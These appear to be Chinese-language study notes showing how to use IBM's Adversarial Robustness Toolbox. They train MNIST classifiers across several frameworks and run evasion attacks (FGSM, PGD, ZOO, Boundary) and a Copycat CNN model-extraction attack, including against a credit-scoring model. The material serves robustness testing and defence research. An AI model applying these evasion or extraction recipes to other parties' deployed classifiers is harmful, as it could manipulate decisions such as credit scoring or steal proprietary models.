model.add(Conv2D(filters=4, kernel_size=(5, 5), strides=1, activation="relu", input_shape=(28, 28, 1)))
model.add(MaxPooling2D(pool_size=(2, 2)))
model.add(Conv2D(filters=10, kernel_size=(5, 5), strides=1, activation="relu", input_shape=(23, 23, 4)))
model.add(MaxPooling2D(pool_size=(2, 2)))
model.add(Flatten())
model.add(Dense(100, activation="relu"))
model.add(Dense(10, activation="softmax"))

model.compile(loss=categorical_crossentropy, optimizer=Adam(learning_rate=0.01), metrics=["accuracy"])

# 步驟 3：創建 ART 分類器

classifier = KerasClassifier(model=model, clip_values=(min_pixel_value, max_pixel_value), use_logits=False)

# 步驟 4：訓練 ART 分類器

classifier.fit(x_train, y_train, batch_size=64, nb_epochs=3)

# 步驟 5：在良性測試樣本上評估 ART 分類器

predictions = classifier.predict(x_test)
accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
print("良性測試樣本的準確率: {}%".format(accuracy * 100))

# 步驟 6：生成對抗性測試樣本
attack = FastGradientMethod(estimator=classifier, eps=0.2)
x_test_adv = attack.generate(x=x_test)

# 步驟 7：在對抗性測試樣本上評估 ART 分類器

predictions = classifier.predict(x_test_adv)
accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
print("對抗性測試樣本的準確率: {}%".format(accuracy * 100))
```
![image](https://hackmd.io/_uploads/H1xg90ZNa.png)

##### PyTorch

```python
# 這個腳本展示了一個使用 ART 與 PyTorch 的簡單示例。這個示例在 MNIST 數據集上訓練一個小型模型
# 並使用快速梯度符號方法創建對抗性示例。這裡我們使用 ART 分類器來訓練模型，
# 也可以向 ART 分類器提供一個預訓練的模型。
# 腳本中選擇的參數是為了減少計算需求，並不是為了最佳準確度。

import torch.nn as nn
import torch.nn.functional as F
import torch.optim as optim
import numpy as np

from art.attacks.evasion import FastGradientMethod
from art.estimators.classification import PyTorchClassifier
from art.utils import load_mnist

# 步驟 0：定義神經網絡模型，forward 方法返回 logits 而非激活值

class Net(nn.Module):
    def __init__(self):
        super(Net, self).__init__()
        self.conv_1 = nn.Conv2d(in_channels=1, out_channels=4, kernel_size=5, stride=1)
        self.conv_2 = nn.Conv2d(in_channels=4, out_channels=10, kernel_size=5, stride=1)
        self.fc_1 = nn.Linear(in_features=4 * 4 * 10, out_features=100)
        self.fc_2 = nn.Linear(in_features=100, out_features=10)

    def forward(self, x):
        x = F.relu(self.conv_1(x))
        x = F.max_pool2d(x, 2, 2)
        x = F.relu(self.conv_2(x))
        x = F.max_pool2d(x, 2, 2)
        x = x.view(-1, 4 * 4 * 10)
        x = F.relu(self.fc_1(x))
        x = self.fc_2(x)
        return x

# 步驟 1：加載 MNIST 數據集

(x_train, y_train), (x_test, y_test), min_pixel_value, max_pixel_value = load_mnist()

# 步驟 1a：將軸交換成 PyTorch 的 NCHW 格式

x_train = np.transpose(x_train, (0, 3, 1, 2)).astype(np.float32)
x_test = np.transpose(x_test, (0, 3, 1, 2)).astype(np.float32)

# 步驟 2：創建模型

model = Net()

# 步驟 2a：定義損失函數和優化器

criterion = nn.CrossEntropyLoss()
optimizer = optim.Adam(model.parameters(), lr=0.01)

# 步驟 3：創建 ART 分類器

classifier = PyTorchClassifier(
    model=model,
    clip_values=(min_pixel_value, max_pixel_value),
    loss=criterion,
    optimizer=optimizer,
    input_shape=(1, 28, 28),
    nb_classes=10,
)

# 步驟 4：訓練 ART 分類器

classifier.fit(x_train, y_train, batch_size=64, nb_epochs=3)

# 步驟 5：在良性測試樣本上評估 ART 分類器

predictions = classifier.predict(x_test)
accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
print("良性測試樣本的準確率: {}%".format(accuracy * 100))

# 步驟 6：生成對抗性測試樣本
attack = FastGradientMethod(estimator=classifier, eps=0.2)
x_test_adv = attack.generate(x=x_test)

# 步驟 7：在對抗性測試樣本上評估 ART 分類器

predictions = classifier.predict(x_test_adv)
accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
print("對抗性測試樣本的準確率: {}%".format(accuracy * 100))
```
![image](https://hackmd.io/_uploads/B1UmqAbVT.png)

##### MxNet
```python
# 這個腳本展示了一個使用 ART 與 MXNet 的簡單示例。這個示例在 MNIST 數據集上訓練一個小型模型
# 並使用快速梯度符號方法創建對抗性示例。這裡我們使用 ART 分類器來訓練模型，
# 也可以向 ART 分類器提供一個預訓練的模型。
# 腳本中選擇的參數是為了減少計算需求，並不是為了最佳準確度。

import mxnet
from mxnet.gluon.nn import Conv2D, MaxPool2D, Flatten, Dense
import numpy as np

from art.attacks.evasion import FastGradientMethod
from art.estimators.classification import MXClassifier
from art.utils import load_mnist

# 步驟 1：加載 MNIST 數據集

(x_train, y_train), (x_test, y_test), min_pixel_value, max_pixel_value = load_mnist()

# 步驟 1a：將軸交換成 MXNet 的 NCHW 格式

x_train = np.transpose(x_train, (0, 3, 1, 2))
x_test = np.transpose(x_test, (0, 3, 1, 2))

# 步驟 2：創建模型

model = mxnet.gluon.nn.Sequential()
with model.name_scope():
    model.add(Conv2D(channels=4, kernel_size=5, activation="relu"))
    model.add(MaxPool2D(pool_size=2, strides=1))
    model.add(Conv2D(channels=10, kernel_size=5, activation="relu"))
    model.add(MaxPool2D(pool_size=2, strides=1))
    model.add(Flatten())
    model.add(Dense(100, activation="relu"))
    model.add(Dense(10))
    model.initialize()

loss = mxnet.gluon.loss.SoftmaxCrossEntropyLoss()
trainer = mxnet.gluon.Trainer(model.collect_params(), "adam", {"learning_rate": 0.01})

# 步驟 3：創建 ART 分類器

classifier = MXClassifier(
    model=model,
    clip_values=(min_pixel_value, max_pixel_value),
    loss=loss,
    input_shape=(28, 28, 1),
    nb_classes=10,
    optimizer=trainer,
    ctx=None,
    channels_first=True,
    preprocessing_defences=None,
    preprocessing=(0.0, 1.0),
)

# 步驟 4：訓練 ART 分類器

classifier.fit(x_train, y_train, batch_size=64, nb_epochs=3)

# 步驟 5：在良性測試樣本上評估 ART 分類器

predictions = classifier.predict(x_test)
accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
print("良性測試樣本的準確率: {}%".format(accuracy * 100))

# 步驟 6：生成對抗性測試樣本
attack = FastGradientMethod(estimator=classifier, eps=0.2)
x_test_adv = attack.generate(x=x_test)

# 步驟 7：在對抗性測試樣本上評估 ART 分類器

predictions = classifier.predict(x_test_adv)
accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
print("對抗性測試樣本的準確率: {}%".format(accuracy * 100))
```
![image](https://hackmd.io/_uploads/Hyqh9Rb4a.png)

##### XGBoost
```python
# 這個腳本展示了一個使用 ART 與 XGBoost 的簡單示例。這個示例在 MNIST 數據集上訓練一個小型模型
# 並使用零階優化攻擊（Zeroth Order Optimization attack）創建對抗性示例。這裡我們提供了一個預訓練的模型給
# ART 分類器。
# 腳本中選擇的參數是為了減少計算需求，並不是為了最佳準確度。

import xgboost as xgb
import numpy as np

from art.attacks.evasion import ZooAttack
from art.estimators.classification import XGBoostClassifier
from art.utils import load_mnist

# 步驟 1：加載 MNIST 數據集

(x_train, y_train), (x_test, y_test), min_pixel_value, max_pixel_value = load_mnist()

# 步驟 1a：平展數據集

x_test = x_test[0:5]
y_test = y_test[0:5]

nb_samples_train = x_train.shape[0]
nb_samples_test = x_test.shape[0]
x_train = x_train.reshape((nb_samples_train, 28 * 28))
x_test = x_test.reshape((nb_samples_test, 28 * 28))

# 步驟 2：創建模型

params = {"objective": "multi:softprob", "eval_metric": ["mlogloss", "merror"], "num_class": 10}
dtrain = xgb.DMatrix(x_train, label=np.argmax(y_train, axis=1))
dtest = xgb.DMatrix(x_test, label=np.argmax(y_test, axis=1))
evals = [(dtest, "test"), (dtrain, "train")]
model = xgb.train(params=params, dtrain=dtrain, num_boost_round=2, evals=evals)

# 步驟 3：創建 ART 分類器

classifier = XGBoostClassifier(
    model=model, clip_values=(min_pixel_value, max_pixel_value), nb_features=28 * 28, nb_classes=10
)

# 步驟 4：訓練 ART 分類器

# 模型已在步驟 2 中訓練

# 步驟 5：在良性測試樣本上評估 ART 分類器

predictions = classifier.predict(x_test)
accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
print("良性測試樣本的準確率: {}%".format(accuracy * 100))

# 步驟 6：生成對抗性測試樣本
attack = ZooAttack(
    classifier=classifier,
    confidence=0.0,
    targeted=False,
    learning_rate=1e-1,
    max_iter=200,
    binary_search_steps=10,
    initial_const=1e-3,
    abort_early=True,
    use_resize=False,
    use_importance=False,
    nb_parallel=5,
    batch_size=1,
    variable_h=0.01,
)
x_test_adv = attack.generate(x=x_test, y=y_test)

# 步驟 7：在對抗性測試樣本上評估 ART 分類器

predictions = classifier.predict(x_test_adv)
accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
print("對抗性測試樣本的準確率: {}%".format(accuracy * 100))

```
![image](https://hackmd.io/_uploads/HkN5aRZ4a.png)
##### LightGBM

```python
# 這個腳本展示了一個使用 ART 與 LightGBM 的簡單示例。這個示例在 MNIST 數據集上訓練一個小型模型
# 並使用快速梯度符號方法（Fast Gradient Sign Method）創建對抗性示例。這裡我們使用 ART 分類器來訓練
# 模型，也可以向 ART 分類器提供一個預訓練的模型。
# 腳本中選擇的參數是為了減少計算需求，並不是為了最佳準確度。

import lightgbm as lgb
import numpy as np

from art.attacks.evasion import ZooAttack
from art.estimators.classification import LightGBMClassifier
from art.utils import load_mnist

# 步驟 1：加載 MNIST 數據集

(x_train, y_train), (x_test, y_test), min_pixel_value, max_pixel_value = load_mnist()

# 步驟 1a：平展數據集

x_test = x_test[0:5]
y_test = y_test[0:5]

nb_samples_train = x_train.shape[0]
nb_samples_test = x_test.shape[0]
x_train = x_train.reshape((nb_samples_train, 28 * 28))
x_test = x_test.reshape((nb_samples_test, 28 * 28))

# 步驟 2：創建模型

params = {"objective": "multiclass", "metric": "multi_logloss", "num_class": 10, "force_col_wise": True}
train_set = lgb.Dataset(x_train, label=np.argmax(y_train, axis=1))
test_set = lgb.Dataset(x_test, label=np.argmax(y_test, axis=1))
model = lgb.train(params=params, train_set=train_set, num_boost_round=100, valid_sets=[test_set])

# 步驟 3：創建 ART 分類器

classifier = LightGBMClassifier(model=model, clip_values=(min_pixel_value, max_pixel_value))

# 步驟 4：訓練 ART 分類器

# 模型已在步驟 2 中訓練

# 步驟 5：在良性測試樣本上評估 ART 分類器

predictions = classifier.predict(x_test)
accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
print("良性測試樣本的準確率: {}%".format(accuracy * 100))

# 步驟 6：生成對抗性測試樣本
attack = ZooAttack(
    classifier=classifier,
    confidence=0.5,
    targeted=False,
    learning_rate=1e-1,
    max_iter=200,
    binary_search_steps=100,
    initial_const=1e-1,
    abort_early=True,
    use_resize=False,
    use_importance=False,
    nb_parallel=250,
    batch_size=1,
    variable_h=0.01,
)
x_test_adv = attack.generate(x=x_test)

# 步驟 7：在對抗性測試樣本上評估 ART 分類器

predictions = classifier.predict(x_test_adv)
accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
print("對抗性測試樣本的準確率: {}%".format(accuracy * 100))

```
![image](https://hackmd.io/_uploads/rJ2_RA-V6.png)

四個攻擊面向比較
- Projected Gradient Descent（PGD），這是一種常用的逃避攻擊方法
```python

import tensorflow.compat.v1 as tf
import numpy as np

tf.compat.v1.disable_eager_execution()  # 添加此行以防止 Tensorflow 執行錯誤

from art.attacks.evasion import ProjectedGradientDescent
from art.estimators.classification import TensorFlowClassifier
from art.utils import load_mnist

# 步驟 1：加載 MNIST 數據集

(x_train, y_train), (x_test, y_test), min_pixel_value, max_pixel_value = load_mnist()

# 步驟 2：創建模型

input_ph = tf.placeholder(tf.float32, shape=[None, 28, 28, 1])
labels_ph = tf.placeholder(tf.int32, shape=[None, 10])

x = tf.layers.conv2d(input_ph, filters=4, kernel_size=5, activation=tf.nn.relu)
x = tf.layers.max_pooling2d(x, 2, 2)
x = tf.layers.conv2d(x, filters=10, kernel_size=5, activation=tf.nn.relu)
x = tf.layers.max_pooling2d(x, 2, 2)
x = tf.layers.flatten(x)
x = tf.layers.dense(x, 100, activation=tf.nn.relu)
logits = tf.layers.dense(x, 10)

loss = tf.reduce_mean(tf.losses.softmax_cross_entropy(logits=logits, onehot_labels=labels_ph))
optimizer = tf.train.AdamOptimizer(learning_rate=0.01)
train = optimizer.minimize(loss)
sess = tf.Session()
sess.run(tf.global_variables_initializer())

# 步驟 3：創建 ART 分類器

classifier = TensorFlowClassifier(
    clip_values=(min_pixel_value, max_pixel_value),
    input_ph=input_ph,
    output=logits,
    labels_ph=labels_ph,
    train=train,
    loss=loss,
    learning=None,
    sess=sess,
    preprocessing_defences=[],
)

# 步驟 4：訓練 ART 分類器

classifier.fit(x_train, y_train, batch_size=64, nb_epochs=3)

# 步驟 5：在良性測試範例上評估 ART 分類器

predictions = classifier.predict(x_test)
accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
print("良性測試範例的準確率: {}%".format(accuracy * 100))

# 步驟 6：生成對抗性測試範例
attack = ProjectedGradientDescent(estimator=classifier, max_iter=10, eps=0.2)
x_test_adv = attack.generate(x=x_test)

# 步驟 7：在對抗性測試範例上評估 ART 分類器

predictions = classifier.predict(x_test_adv)
accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
print("對抗性測試範例的準確率: {}%".format(accuracy * 100))

```
![image](https://hackmd.io/_uploads/S1YwS84ST.png)

- Copycat CNN ，這是一種提取攻擊方法
```python
import numpy as np
import tensorflow as tf
from art.attacks.extraction import CopycatCNN
from art.estimators.classification import TensorFlowClassifier
from art.utils import load_mnist

# 禁用 eager execution 以兼容 ART
tf.compat.v1.disable_eager_execution()

# 加載 MNIST 數據集
(x_train, y_train), (x_test, y_test), min_pixel_value, max_pixel_value = load_mnist()

# 創建 TensorFlow 模型
input_ph = tf.compat.v1.placeholder(tf.float32, shape=[None, 28, 28, 1])
labels_ph = tf.compat.v1.placeholder(tf.int32, shape=[None, 10])

x = tf.compat.v1.layers.conv2d(input_ph, filters=4, kernel_size=5, activation=tf.nn.relu)
x = tf.compat.v1.layers.max_pooling2d(x, 2, 2)
x = tf.compat.v1.layers.conv2d(x, filters=10, kernel_size=5, activation=tf.nn.relu)
x = tf.compat.v1.layers.max_pooling2d(x, 2, 2)
x = tf.compat.v1.layers.flatten(x)
x = tf.compat.v1.layers.dense(x, 100, activation=tf.nn.relu)
logits = tf.compat.v1.layers.dense(x, 10)

loss = tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(logits=logits, labels=tf.stop_gradient(labels_ph)))
optimizer = tf.compat.v1.train.AdamOptimizer(learning_rate=0.01)
train = optimizer.minimize(loss)

sess = tf.compat.v1.Session()
sess.run(tf.compat.v1.global_variables_initializer())

# 創建 ART 分類器
classifier = TensorFlowClassifier(
    clip_values=(min_pixel_value, max_pixel_value),
    input_ph=input_ph,
    output=logits,
    labels_ph=labels_ph,
    train=train,
    loss=loss,
    learning=None,
    sess=sess
)

# 訓練模型
classifier.fit(x_train, y_train, batch_size=64, nb_epochs=3)

# 評估攻擊前模型的準確率
predictions = classifier.predict(x_test)
accuracy_before_attack = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
print("攻擊前模型的準確率: {}%".format(accuracy_before_attack * 100))

# 使用 Copycat CNN 進行提取攻擊
attack = CopycatCNN(classifier=classifier, batch_size_fit=128, batch_size_query=128)
thieved_classifier = TensorFlowClassifier(
    clip_values=(min_pixel_value, max_pixel_value),
    input_ph=input_ph,
    output=logits,
    labels_ph=labels_ph,
    train=train,
    loss=loss,
    learning=None,
    sess=sess
)
x_test_adv = attack.extract(x=x_test, y=y_test, thieved_classifier=thieved_classifier)

# 評估攻擊後模型的準確率
predictions = thieved_classifier.predict(x_test)
accuracy_after_attack = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
print("攻擊後模型的準確率: {}%".format(accuracy_after_attack * 100))

```
```python
# FastGradientMethod
# 導入警告模塊，並關閉所有警告
import warnings
warnings.filterwarnings('ignore')

# 設定 TensorFlow 的環境變量，以減少日誌輸出
import os
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'

# 導入 TensorFlow 和相關層
import tensorflow as tf
from tensorflow.keras.layers import Dense, Flatten, Conv2D
from tensorflow.keras import Model

# 導入其他必要的庫
import numpy as np
from matplotlib import pyplot as plt

# 導入 ART (Adversarial Robustness Toolbox) 的分類器和多種對抗性攻擊方法
from art.estimators.classification import TensorFlowV2Classifier
from art.attacks.evasion import FastGradientMethod, CarliniLInfMethod
from art.attacks.evasion import ProjectedGradientDescent
from art.attacks.evasion import AutoProjectedGradientDescent
from art.attacks.evasion import AutoConjugateGradient

# 檢查 TensorFlow 的版本，確保是 2.x 版本
if tf.__version__[0] != '2':
    raise ImportError('This notebook requires TensorFlow v2.')

# 加載 MNIST 數據集，並對數據進行預處理
(x_train, y_train), (x_test, y_test) = tf.keras.datasets.mnist.load_data()
x_train, x_test = x_train / 255.0, x_test / 255.0

# 將數據轉換為 float32 類型
x_train = x_train.astype(np.float32)
x_test = x_test.astype(np.float32)

# 選擇部分測試數據進行測試
x_test = x_test[0:10]
y_test = y_test[0:10]

# 增加一個額外的維度
x_train = x_train[..., tf.newaxis]
x_test = x_test[..., tf.newaxis]

# 定義損失函數和優化器
loss_object = tf.keras.losses.SparseCategoricalCrossentropy()
optimizer = tf.keras.optimizers.Adam()

# 設置訓練和測試時的度量標準
train_loss = tf.keras.metrics.Mean(name='train_loss')
train_accuracy = tf.keras.metrics.SparseCategoricalAccuracy(name='train_accuracy')
test_loss = tf.keras.metrics.Mean(name='test_loss')
test_accuracy = tf.keras.metrics.SparseCategoricalAccuracy(name='test_accuracy')

# 定義一個 Keras 模型
class KerasModel(Model):
    def __init__(self):
        super(KerasModel, self).__init__()
        self.conv1 = Conv2D(filters=3, kernel_size=3, activation='relu')
        self.flatten = Flatten()
        self.dense1 = Dense(10, activation='softmax')

    def call(self, x):
        x = self.conv1(x)
        x = self.flatten(x)
        x = self.dense1(x)
        return x

# 實例化模型和準備訓練測試數據
model = KerasModel()
train_ds = tf.data.Dataset.from_tensor_slices((x_train, y_train)).shuffle(10000).batch(32)
test_ds = tf.data.Dataset.from_tensor_slices((x_test, y_test)).batch(32)

# 定義訓練和測試步驟
@tf.function
def train_step(images, labels):
    with tf.GradientTape() as tape:
        predictions = model(images)
        loss = loss_object(labels, predictions)
    gradients = tape.gradient(loss, model.trainable_variables)
    optimizer.apply_gradients(zip(gradients, model.trainable_variables))
    train_loss(loss)
    train_accuracy(labels, predictions)

@tf.function
def test_step(images, labels):
    predictions = model(images)
    t_loss = loss_object(labels, predictions)

    test_loss(t_loss)
    test_accuracy(labels, predictions)

# 設定並執行訓練循環
epochs = 3
for epoch in range(epochs):
    for images, labels in train_ds:
        train_step(images, labels)

    for test_images, test_labels in test_ds:
        test_step(test_images, test_labels)

    # 打印訓練和測試的損失以及準確率
    template = 'Epoch {}, Loss: {:4.2f}, Accuracy: {:4.2f}, Test Loss: {:4.2f}, Test Accuracy: {:4.2f}'
    print(template.format(epoch + 1,
                          train_loss.result(),
                          train_accuracy.result() * 100,
                          test_loss.result(),
                          test_accuracy.result() * 100))

# 在測試數據上評估模型的準確率
y_test_pred = np.argmax(model(x_test), axis=1)
accuracy_test = np.sum(y_test_pred == y_test) / y_test.shape[0]
print('Accuracy on test data: {:4.2f}%'.format(accuracy_test * 100))

# 使用 ART 初始化 TensorFlow v2 分類器
classifier = TensorFlowV2Classifier(model=model, nb_classes=10, input_shape=(28, 28, 1), loss_object=loss_object,
                                    clip_values=(0, 1), channels_first=False)

# 定義 FGSM 攻擊並生成對抗性範例
attack_fgsm = FastGradientMethod(estimator=classifier)
x_test_adv = attack_fgsm.generate(x_test)

# 在對抗性測試數據上評估模型
y_test_pred = np.argmax(model(x_test_adv), axis=1)
accuracy_test_adv = np.sum(y_test_pred == y_test) / y_test.shape[0]
perturbation = np.mean(np.abs((x_test_adv - x_test)))
print('Accuracy on adversarial test data: {:4.2f}%'.format(accuracy_test_adv * 100))
print('Average perturbation: {:4.2f}'.format(perturbation))

```
#### 1. 初始化和環境設置
```python
import warnings
warnings.filterwarnings('ignore')
import os
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'
import tensorflow as tf
from tensorflow.keras.layers import Dense, Flatten, Conv2D
from tensorflow.keras import Model
import numpy as np
from matplotlib import pyplot as plt
import tensorflow.keras.losses
import tensorflow.keras.optimizers
import tensorflow.keras.metrics
from art.estimators.classification import TensorFlowV2Classifier
from art.attacks.evasion import AutoProjectedGradientDescent

# 確保使用的是 TensorFlow 2
if tf.__version__[0] != '2':
    raise ImportError('This notebook requires TensorFlow v2.')
```
* 目的：導入所需的庫和模塊，設置環境以隱藏警告和日誌消息。
* 主要動作：導入 TensorFlow、Keras 層、ART 分類器等，並檢查 TensorFlow 版本。


#### 2. 加載和預處理數據
```python
# 載入 MNIST 數據集
(x_train, y_train), (x_test, y_test) = tf.keras.datasets.mnist.load_data()
x_train, x_test = x_train / 255.0, x_test / 255.0

x_train = x_train.astype(np.float32)
x_test = x_test.astype(np.float32)

x_test = x_test[0:10]
y_test = y_test[0:10]

x_train = x_train[..., tf.newaxis]
x_test = x_test[..., tf.newaxis]
```

* 目的：加載 MNIST 手寫數字數據集，將數據標準化到 [0, 1] 範圍內，轉換數據類型，並準備一個測試子集。
* 主要動作：標準化和格式調整。


#### 3. 定義損失函數和優化器

```python
loss_object = tf.keras.losses.SparseCategoricalCrossentropy(from_logits=True)
optimizer = tf.keras.optimizers.Adam()
```

* 目的：為訓練過程選擇合適的損失函數和優化器。
* 主要動作：選擇稀疏分類交叉熵損失函數和 Adam 優化器。


#### 4. 定義和構建神經網絡模型
```python
class KerasModel(Model):
    def __init__(self):
        super(KerasModel, self).__init__()
        self.conv1 = Conv2D(filters=3, kernel_size=3, activation='relu')
        self.flatten = Flatten()
        self.dense1 = Dense(10)  # 移除 softmax，直接輸出 logits

    def call(self, x):
        x = self.conv1(x)
        x = self.flatten(x)
        return self.dense1(x)

model = KerasModel()
```
* 目的：定義一個用於數字分類的卷積神經網絡。
* 主要動作：構建具有卷積層、平坦層和全連接層的模型。


#### 5. 訓練模型
```python
train_ds = tf.data.Dataset.from_tensor_slices((x_train, y_train)).shuffle(10000).batch(32)
test_ds = tf.data.Dataset.from_tensor_slices((x_test, y_test)).batch(32)

@tf.function
def train_step(images, labels):
    with tf.GradientTape() as tape:
        predictions = model(images)
        loss = loss_object(labels, predictions)
    gradients = tape.gradient(loss, model.trainable_variables)
    optimizer.apply_gradients(zip(gradients, model.trainable_variables))

epochs = 3
for epoch in range(epochs):
    for images, labels in train_ds:
        train_step(images, labels)
```
* 目的：使用批量訓練的方式來訓練神經網絡。
* 主要動作：對每個批量的數據計算損失，然後更新網絡的權重。


#### 6. 將 Keras 模型轉換為 ART 分類器

```python
classifier = TensorFlowV2Classifier(
    model=model,
    loss_object=loss_object,
    train_step=train_step,
    nb_classes=10,
    input_shape=(28, 28, 1),
    clip_values=(0, 1)
)
```
* 目的：將 Keras 模型轉換為 ART 可用的格式，以進行對抗性攻擊。
* 主要動作：包裝原生 TensorFlow 模型以適配 ART。


#### 7. 使用 ART 分類器進行攻擊

```python
attack = AutoProjectedGradientDescent(estimator=classifier)
x_test_adv = attack.generate(x=x_test)
```
* 目的：使用自動投影梯度下降（AutoProjectedGradientDescent）攻擊來生成對抗性樣本。
* 主要動作：選擇攻擊方法並生成對抗性樣本。


#### 8. 評估對抗性樣本對模型的影響
```python
y_test_pred = np.argmax(tf.nn.softmax(model(x_test_adv)), axis=1)
accuracy_test_adv = np.sum(y_test_pred == y_test) / y_test.shape[0]
perturbation = np.mean(np.abs((x_test_adv - x_test)))
print('Accuracy on adversarial test data: {:4.2f}%'.format(accuracy_test_adv * 100))
print('Average perturbation: {:4.2f}'.format(perturbation))
```
### 新加坡模型credit_scoring test
[這項工作是新加坡金融管理局委託 Veritas 計畫的一部分進行的，目標是加速在金融服務業採用負責任的人工智慧和數據分析 (AIDA)。](https://github.com/veritas-project/phase1/blob/main/credit_scoring/README.md)
其中模型是以Scikit-learn框架的羅吉斯回歸
```bash
$pip install adversarial-robustness-toolbox
$pip install adversarial-robustness-toolbox[tensorflow]
$git clone https://github.com/veritas-project/phase1.git
$pip install scipy==1.5.2
$pip install numpy==1.19.2
$pip install matplotlib==3.3.2
$pip install pandas==1.1.3
$pip install scikit-learn==0.23.2
$pip install imbalanced-learn==0.7.0
$pip install jupyterlab==2.2.6
$pip install pytest==6.1.1
$pip install flake8==3.8.4
```
![image](https://hackmd.io/_uploads/rJKVNoSF6.png)

#### 1.導入庫和設置
```python

# 導入所需的庫
import os
import json
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
from sklearn.preprocessing import StandardScaler
from sklearn.linear_model import LogisticRegression
from sklearn.pipeline import Pipeline
from sklearn.model_selection import StratifiedKFold, cross_validate, cross_val_score
from sklearn.calibration import calibration_curve
from sklearn import metrics
import utils.credit as utils

# Jupyter Notebook 設置
%load_ext autoreload
%autoreload 2
%config InlineBackend.figure_format = 'retina'

```

#### 2.數據加載和預處理

```python
# 定義要刪除的列
drop_cols = ['ID']

# 從 CSV 文件中加載數據集
X_train, y_train = utils.load_dataset(os.path.join('data', 'creditdata', 'creditdata_train_v2.csv'), drop_columns=drop_cols)
X_test, y_test = utils.load_dataset(os.path.join('data', 'creditdata', 'creditdata_test_v2.csv'), drop_columns=drop_cols)

# 打印數據集信息
print(f"Number of features: {len(X_train.columns)}")
print(f"Train set length: {len(y_train)}, default rate: {round(1 - np.mean(y_train), 4)}")
print(f"Test set length: {len(y_test)}, default rate: {round(1 - np.mean(y_test), 4)}")
print(X_train.columns)
```
![image](https://hackmd.io/_uploads/S1V9NiSYp.png)

#### 3. 邏輯回歸模型

```python
# 定義模型參數
best_regularizer = 1e-1
best_th = 0.43

# 訓練邏輯回歸模型
model = utils.train_log_reg_model(X_train, y_train, seed=0, C=best_regularizer, upsample=True, verbose=True)
```


![image](https://hackmd.io/_uploads/B184vjSK6.png)

#### 4. 模型訓練和評估
```python
# 計算測試集上的性能
def prob_of_good(model, X):
    return model.predict_proba(X)[:, 1] # prob of resolve (good)

test_probs = prob_of_good(model, X_test)
test_preds = np.where(test_probs > best_th, 1, 0)
test_bal_acc = metrics.balanced_accuracy_score(y_test, test_preds)
print(f"Balanced accuracy on test set {round(test_bal_acc, 5)} at threshold {round(best_th, 5)}")

# 繪製 ROC 曲線
def plot_roc(model, X, y):
    figure = plt.figure(figsize=(5,5))
    plt.plot([0, 1], [0, 1], linestyle='--', lw=2, color='r', label='Random Chance', alpha=.8)
    metrics.plot_roc_curve(model, X, y, name='model', alpha=0.3, lw=2, ax=plt.gca())
    plt.title('Receiver Operating Characteristic (ROC) Curve', fontsize=13)
    plt.xlabel('False Positive Rate', fontsize=12)
    plt.ylabel('True Positive Rate', fontsize=12)
    plt.show()

plot_roc(model, X_test, y_test)

```
![image](https://hackmd.io/_uploads/B1eXujSYa.png)
![image](https://hackmd.io/_uploads/rJvHdjHFT.png)
![image](https://hackmd.io/_uploads/SyoLdiHKa.png)

#### 4. 使用 ART 進行對抗性攻擊
##### BoundaryAttack
```python
from art.estimators.classification import SklearnClassifier
from art.attacks.evasion import BoundaryAttack
import warnings
warnings.filterwarnings('ignore')
# 將 Pandas DataFrame 轉換為 NumPy 陣列
X_test_np = X_test.to_numpy()

# 選擇一些樣本進行攻擊
x_test_sample = X_test_np[:10]  # 選擇前10個樣本
y_test_sample = y_test[:10]

# 將邏輯回歸模型封裝成 ART 分類器
model_art = SklearnClassifier(model=model)

# 初始化 Boundary Attack
attack = BoundaryAttack(
    estimator=model_art,
    epsilon=0.1,  # 初始步長
    step_adapt=0.5,  # 步長適應因子
    max_iter=100,  # 最大迭代次數
    num_trial=100,  # 每次迭代的嘗試次數
    sample_size=20,  # 每次試驗的樣本數
    init_size=10,  # 初始生成對抗樣本的最大嘗試次數
    min_epsilon=1e-6,  # 最小扰動
    verbose=True  # 顯示進度條
)

# 執行攻擊
x_test_adv = attack.generate(x=x_test_sample, y=y_test_sample)

# 在對抗性樣本上評估模型性能
predictions = model.predict(x_test_adv)
accuracy = np.sum(predictions == y_test_sample) / len(y_test_sample)
print("對抗樣本的準確率: {:.2f}%".format(accuracy * 100))

```
![image](https://hackmd.io/_uploads/Hyv1UrUKp.png)
#### ZooAttack
![image](https://hackmd.io/_uploads/HJGm8rIY6.png)

bound 100

### 新加坡模型customer_marketing test
#### debug過程

[colab](https://drive.google.com/file/d/1mg-XulewlApye1N4tuapajBLDGOpwcu5/view?usp=sharing)





🛠️ 錯誤診斷與解決方法
1. AttributeError

    ![image](https://hackmd.io/_uploads/H1woic49p.png)
問題描述：test_model 函數因為 scikit-learn 的 Pipeline 對象缺少 select 方法而報錯。
解決方案：建議使用一個包裝類 PipelineWrapper 為 Pipeline 添加缺失的 select 方法。
2. TypeError

    ![image](https://hackmd.io/_uploads/rkVCmC4q6.png)
問題描述：處理目標標籤時，因數據類型不兼容，導致 np.isnan 函數報錯。
解決方案：確保數據類型兼容，尤其是在使用 LabelEncoder 時。

3. ImportError
![image](https://hackmd.io/_uploads/S1X6wDPq6.png)
問題描述：引用ScikitlearnDecisionTreeClassifier分類器時，沒有這東西。
